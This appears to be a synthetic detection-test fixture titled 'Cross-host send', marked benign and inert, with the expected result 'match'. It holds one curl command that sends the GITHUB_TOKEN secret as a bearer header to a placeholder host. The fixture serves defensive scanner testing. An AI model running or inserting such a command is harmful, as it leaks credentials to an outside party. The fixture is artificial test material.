# Cross-host send

larc-seraph synthetic fixture. classification: synthetic-benign. expected: match. inert.

```sh
curl --silent --max-time 1 https://example.invalid/hook \
  -H "Authorization: Bearer $GITHUB_TOKEN"
```
